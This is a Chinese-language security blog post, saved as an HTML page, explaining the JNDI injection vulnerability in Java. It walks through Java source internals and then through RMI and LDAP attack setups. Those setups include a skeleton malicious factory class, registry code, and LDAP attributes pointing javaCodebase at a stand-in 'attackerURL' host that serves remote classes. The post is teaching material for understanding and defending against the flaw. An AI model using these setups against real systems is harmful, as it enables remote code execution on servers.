@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en" data-theme=""><head>
+    <title> c00l | Jndi注入漏洞 </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.74.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="stay hungry, stay foolish">
+    
+    <link rel="stylesheet" href="https://Pegasuscc.github.io/css/style.min.5be3a155aa89a24586c761b1b5538c4040e3735ee32ac12a708dc1696c0982f5.css" integrity="sha256-W&#43;OhVaqJokWGx2GxtVOMQEDjc17jKsEqcI3BaWwJgvU=" crossorigin="anonymous" type="text/css"><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://Pegasuscc.github.io/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://Pegasuscc.github.io/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://Pegasuscc.github.io/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://Pegasuscc.github.io/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://Pegasuscc.github.io/post/jndi%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    
+    
+    <script type="text/javascript" src="https://Pegasuscc.github.io/js/anatole-header.min.7e2fc0724240b28c6e214687e73a4a6eb6c196bbace546b9dc86e94cca120b5c.js" integrity="sha256-fi/AckJAsoxuIUaH5zpKbrbBlrus5Ua53IbpTMoSC1w=" crossorigin="anonymous"></script>
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://Pegasuscc.github.io/images/"/>
+
+<meta name="twitter:title" content="Jndi注入漏洞"/>
+<meta name="twitter:description" content="0x01 JNDI简介 Jndi 全称是：Java Naming and Directory Interface，叫做Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的接口和命名、目录等服务进行交互，如RMI、LDAP、DNS、CORBA。通过底层不同的JNDI服务提供者接口(SPI)的实现，由Naming Manager将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互，如绑定、查找等动作。如下图："/>
+
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://Pegasuscc.github.io/images/timg.jpeg" alt="profile picture">
+        <h3 title=""><a href="/">I&#39;m c00l</a></h3>
+        <div class="description">
+          <p>stay hungry, stay foolish</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://de.linkedin.com/" rel="me" aria-label="Linkedin">
+          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/Pegasuscc" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://www.instagram.com/" rel="me" aria-label="instagram">
+          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="mailto:liuisdata@gmail.com" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; c00l 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false" >
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+      </a>
+    <ul class="nav" id="navMenu">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+        
+        <li class="theme-switch-item">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+        </li>
+    </ul>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Jndi注入漏洞
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i>
+          <span class="date">Wed, Aug 19, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">4-minute read</span>
+        </div>
+        
+        </div>
+
+    <h2 id="0x01-jndi简介">0x01 JNDI简介</h2>
+<p>Jndi 全称是：Java Naming and Directory Interface，叫做Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的接口和命名、目录等服务进行交互，如RMI、LDAP、DNS、CORBA。通过底层不同的JNDI服务提供者接口(SPI)的实现，由Naming Manager将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互，如绑定、查找等动作。如下图：</p>
+<p><img src="/images/jndiarch.gif" alt="请在这里输入图片描述"></p>
+<p><strong>Java Naming Service</strong>
+命名服务是一种键值对的绑定，应用程序可以通过键检索值</p>
+<p><strong>Java Directory Service</strong>
+目录服务是一种特俗的命名服务，可以存储和搜索目录对象。两者之间的关键差别是目录服务中对象可以有属性（例如，用户有email地址），而命名服务中对象没有属性。因此，在目录服务中，你可以根据属性搜索对象。</p>
+<p>JNDI提供了两个方法来实现对象的绑定和查找：</p>
+<pre><code>1、void bind( String name , Object object ) //将名称绑定到对象
+2、Object lookup( String name ) //通过名字查找对象
+</code></pre>
+<h3 id="示例">示例</h3>
+<p>使用JNDI访问RMI Registry服务</p>
+<pre><code>// Create the initial context 
+Hashtable env = new Hashtable(); 
+env.put(Context.INITIAL_CONTEXT_FACTORY, 
+&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); 
+env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;); 
+Context ctx = new InitialContext(env); 
+// Bind a String to the name &quot;Foo&quot; in the Registry 
+ctx.bind(&quot;foo&quot;, &quot;Sample String&quot;); 
+// Look up the object 
+Object local_obj = ctx.lookup(&quot;foo&quot;); 
+// Print it 
+System.out.println(name + &quot; is bound to: &quot; + obj);
+</code></pre>
+<p>使用JNDI访问LDAP目录服务</p>
+<pre><code> // Create the initial context 
+Hashtable env = new Hashtable(); 
+env.put(Context.INITIAL_CONTEXT_FACTORY, 
+&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;); 
+env.put(Context.PROVIDER_URL, &quot;ldap://localhost:389&quot;); 
+DirContext ctx = new InitialDirContext(env); 
+// Bind a String to the name “Foo“ in the Directory 
+ctx.bind(&quot;cn=foo,dc=test,dc=org&quot;, &quot;Sample String&quot;); 
+// Look up the object 
+Object local_obj = ctx.lookup(&quot;cn=foo,dc=test,dc=org&quot;); 
+// Print it 
+System.out.println(name + &quot; is bound to: &quot; + obj);
+</code></pre>
+<h3 id="jndi-naming-references">JNDI Naming References</h3>
+<p>为了在Java命名服务和目录服务中存储java对象，可以使用序列化的方式得到表示对象某状态的字节序列，将字节序列存储到目录服务中，如LDAP服务绑定对象时会序列化对象进行存储。
+然而这种方法并不总是可行，因此java提出了一种绑定引用的方式，应用lookup查找键得到引用，解析引用来获得对象的真正存储地址，进而获得实际对象。
+引用由Reference类来创建，由一个类或者工厂的地址和所引用的对象的类信息构成；一个引用也可以使用工厂来创建所引用的对象，在该模式下，引用保存了工厂类的类名和地址，以及引用的对象的类名，示例：</p>
+<pre><code>//参数：类名、工厂类名、工厂地址
+Reference reference = new Reference(&quot;MyClass&quot;,&quot;MyClass&quot;,FactoryURL); 
+ReferenceWrapper wrapper = new ReferenceWrapper(reference); 
+ctx.bind(&quot;Foo&quot;, wrapper);
+</code></pre>
+<p>通过引用来获取对象有其他方式，但是使用工厂这种方式攻击者尤其感兴趣，原因在于工厂类可以存储在任意远程地址且会在应用本地进行实例化，这就意味着攻击者可以构造恶意的工厂类，使应用加载使用了恶意工厂类的引用，从而在实例化工厂时执行恶意代码。</p>
+<h2 id="0x02-漏洞成因">0x02 漏洞成因</h2>
+<p>JNDI注入产生的原因可以归为以下几点：</p>
+<ol>
+<li>InitialContext类及他的子类的lookup方法允许动态协议转换</li>
+<li>Java提供了Naming References，lookup查找的对象可以是Reference类型及其子类，且可以远程加载对象的类或者工厂类</li>
+<li>lookup参数可控</li>
+</ol>
+<h4 id="动态协议转换">动态协议转换</h4>
+<p>InitialContext的方法lookup会根据url参数值动态的转换目录和命名服务的协议和地址，以下是lookup函数原型：</p>
+<pre><code>public Object lookup(String name) throws NamingException {
+return getURLOrDefaultInitCtx(name).lookup(name);
+}
+</code></pre>
+<p>getURLOrDefaultInitCtx(name) 会判断条件来决定返回的context，1号处的返回不会修改原来context中指定的协议，但会修改主机地址和端口，2号处的返回会识别url scheme，设置context的scheme，即进行动态协议转换，同时修改初始化时设置的主机地址和端口。</p>
+<pre><code>protected Context getURLOrDefaultInitCtx(String name)
+    throws NamingException {
+    if (NamingManager.hasInitialContextFactoryBuilder()) {
+        return getDefaultInitCtx();         // 1
+    }
+    String scheme = getURLScheme(name);
+    if (scheme != null) {
+        Context ctx = NamingManager.getURLContext(scheme, myProps);
+        if (ctx != null) {
+            return ctx;        // 2
+        }
+    }
+    return getDefaultInitCtx();
+}
+</code></pre>
+<p>基于上述特性，即使PROVIDER_URL被设置为了本地服务器（此时lookup(&ldquo;foo&rdquo;)会连接本地服务器查找foo），攻击者也可以提交一个url覆盖PROVIDER_URL的值，使得lookup(&ldquo;foo&rdquo;)使用其他协议连接恶意服务器查找foo对应的对象。示例如下：</p>
+<pre><code>// Create the initial context 
+Hashtable env = new Hashtable(); 
+env.put(Context.INITIAL_CONTEXT_FACTORY, 
+    &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); 
+env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;); 
+    Context ctx = new InitialContext(env); 
+// Look up in the local RMI registry 
+Object local_obj = ctx.lookup(&lt;evil url&gt;);
+</code></pre>
+<h4 id="reference加载远程对象">Reference加载远程对象</h4>
+<p>考虑一个RMI服务，Foo绑定了一个Reference对象：</p>
+<pre><code>Reference reference = new Reference(&quot;MyClass&quot;,&quot;MyClass&quot;,FactoryURL); 
+ReferenceWrapper wrapper = new ReferenceWrapper(reference); 
+ctx.bind(&quot;Foo&quot;, wrapper);
+</code></pre>
+<p>当client应用执行lookup时，会调用decodeObject解码对象。</p>
+<pre><code>    public Object lookup(Name var1) throws NamingException {
+    if (var1.isEmpty()) {
+        return new RegistryContext(this);
+    } else {
+        Remote var2;
+        try {
+            var2 = this.registry.lookup(var1.get(0));
+        } catch (NotBoundException var4) {
+            throw new NameNotFoundException(var1.get(0));
+        } catch (RemoteException var5) {
+            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
+        }
+
+        return this.decodeObject(var2, var1.getPrefix(1));   //解码对象
+    }
+}
+</code></pre>
+<p>decodeObject()方法对reference对象会调用NamingManager.getObjectInstance()，实例化reference工厂并创建目标对象：</p>
+<pre><code>public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx,
+                      Hashtable&lt;?,?&gt; environment) throws Exception
+{
+    ...
+    // Use reference if possible
+    Reference ref = null;
+    if (refInfo instanceof Reference) {
+        ref = (Reference) refInfo;
+    } else if (refInfo instanceof Referenceable) {
+        ref = ((Referenceable)(refInfo)).getReference();
+    }
+
+    Object answer;
+
+    if (ref != null) {
+        String f = ref.getFactoryClassName();
+        if (f != null) {
+            // if reference identifies a factory, use exclusively
+
+            factory = getObjectFactoryFromReference(ref, f);  //传入reference对象和工厂类名，获得工厂实例
+            if (factory != null) {
+                return factory.getObjectInstance(ref, name, nameCtx,   //创建对象
+                                                 environment);
+            }
+    ...
+}
+</code></pre>
+<p>getObjectFactoryFromReference(ref, f)会创建一个工厂实例。先在本地class path中搜索工厂类，没有的话，则从reference中的地址加载工厂类：</p>
+<pre><code>static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName)
+    throws IllegalAccessException, InstantiationException, MalformedURLException {
+    Class&lt;?&gt; clas = null;
+
+    // Try to use current class loader
+    try {
+         clas = helper.loadClass(factoryName);
+    } catch (ClassNotFoundException e) {
+        // ignore and continue
+        // e.printStackTrace();
+    }
+    // All other exceptions are passed up.
+
+    // Not in class path; try to use codebase
+    String codebase;
+    if (clas == null &amp;&amp;
+            (codebase = ref.getFactoryClassLocation()) != null) {
+        try {
+        
+    //reference中的工厂类名和工厂类地址，加载工厂类
+            clas = helper.loadClass(factoryName, codebase); 
+        } catch (ClassNotFoundException e) {
+        }
+    }
+    //创建工厂实例
+    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+}
+</code></pre>
+<p>可以看到，最后调用newInstance()创建了一个工厂实例，<strong>若构造器中有恶意代码则得以执行</strong>。</p>
+<p>对于其他服务如LDAP，JNDI的实现略有区别，但总体机制一样，仍存在解析reference，加载并实例化远程工厂类的行为，此处不再赘述。</p>
+<h4 id="lookup参数可控">lookup参数可控</h4>
+<p>上述lookup机制可利用的前提是攻击者可以控制lookup参数，即攻击者能够提交恶意数据，经过应用处理后，全部或者部分数据作为lookup的参数，使得应用lookup时连接恶意服务器。</p>
+<h2 id="0x03-漏洞危害">0x03 漏洞危害</h2>
+<p><strong>可于服务器执行任意代码。</strong></p>
+<p>典型攻击方式是，攻击者提交恶意数据修改应用lookup的地址为攻击者控制的命名服务或者目录服务地址，应用执行lookup会获得一个JNDI引用，该引用包含了一个恶意的工厂类，在client应用解码该引用对象时执行恶意代码。</p>
+<p>常见攻击向量有RMI、LDAP、CORBA。</p>
+<h4 id="rmi">RMI</h4>
+<p>定义一个工厂类Exec.java，可在构造器中或者getObjectInstance中写恶意代码：</p>
+<pre><code>public class Exec implements ObjectFactory {
+    public Exec(){
+        //evil code here
+    }
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        //evil code here
+        return null;
+    }
+}
+</code></pre>
+<p>创建一个RMI registry服务：</p>
+<pre><code>Registry registry = LocateRegistry.createRegistry(1099);
+Reference r = new Reference(&quot;Exec&quot;, &quot;Exec&quot;, &quot;存放工厂类文件的URL&quot;);
+ReferenceWrapper rw = new ReferenceWrapper(r);
+registry.bind(&quot;foo&quot;, rw);
+</code></pre>
+<p>攻击者只需将所控制的RMI服务的url（rmi://rmihost:port/foo）提交给应用，作为lookup的参数，即可实现任意代码执行。</p>
+<p><strong>攻击过程如下：</strong></p>
+<ol>
+<li>攻击者提交RMI URL给应用的lookup方法</li>
+<li>应用服务器连接恶意RMI Registry，查询得到一个JNDI Reference</li>
+<li>应用服务器解码Reference</li>
+<li>应用服务器从攻击者控制的服务器加载工厂类</li>
+<li>应用实例化工厂类</li>
+<li>恶意代码得到执行</li>
+</ol>
+<p><img src="/images/jattack-rmi.png" alt="请在这里输入图片描述"></p>
+<h4 id="ldap">LDAP</h4>
+<p>LDAP与RMI的攻击方式类似。</p>
+<p>首先定义一个工厂类Exec.java，可在构造器中或者getObjectInstance中写恶意代码：</p>
+<pre><code>public class Exec implements ObjectFactory {
+    public Exec(){
+        //evil code here
+    }
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        //evil code here
+        return null;
+    }
+}
+</code></pre>
+<p>搭建一个LDAP Server，修改Entry属性如下：</p>
+<pre><code>Attribute mod1 = new BasicAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);   //设置object class为javaNamingReference，JNDI将如下属性作为reference解析
+Attribute mod2 = new BasicAttribute(&quot;javaCodebase&quot;,    //工厂类地址
+            &quot;http://attackerURL/&quot;);
+Attribute mod3 = new BasicAttribute(&quot;javaClassName&quot;,    //目标类名
+            &quot;Exec&quot;);
+Attribute mod4 = new BasicAttribute(&quot;javaFactory&quot;, &quot;Exec&quot;);  //工厂类名
+ModificationItem[] mods = new ModificationItem[] {
+            new ModificationItem(DirContext.ADD_ATTRIBUTE, mod1),
+            new ModificationItem(DirContext.ADD_ATTRIBUTE, mod2),
+            new ModificationItem(DirContext.ADD_ATTRIBUTE, mod3),
+            new ModificationItem(DirContext.ADD_ATTRIBUTE, mod4)
+};
+ctx.modifyAttributes(&quot;uid=target,ou=People,dc=example,dc=com&quot;, mods);
+</code></pre>
+<p>攻击者只需将所控制的LDAP服务的url（ldap://ldaphost:port/uid=target,ou=People,dc=example,dc=com）提交给应用，作为lookup的参数，即可实现任意代码执行。</p>
+<p>实际攻击可以直接使用相关工具，如marshalsec，不用搭建ldap服务。</p>
+<p><strong>攻击过程如下：</strong></p>
+<ol>
+<li>攻击者提交LDAP url给应用的lookup方法</li>
+<li>应用服务器连接恶意LDAP Server，查询得到一个JNDI Reference</li>
+<li>应用服务器解码 JNDI Reference</li>
+<li>应用服务器从攻击者控制的服务器加载工厂类</li>
+<li>应用实例化工厂类</li>
+<li>恶意代码得到执行</li>
+</ol>
+<p><img src="/images/attacj-ldap.png" alt="请在这里输入图片描述"></p>
+<h4 id="示例-1">示例：</h4>
+<p>通过JNDI注入漏洞打开目标机器的计算器</p>
+<p><img src="/images/jndiLdap_ep.png" alt="请在这里输入图片描述"></p>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://Pegasuscc.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://Pegasuscc.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://Pegasuscc.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>
+
+</html>
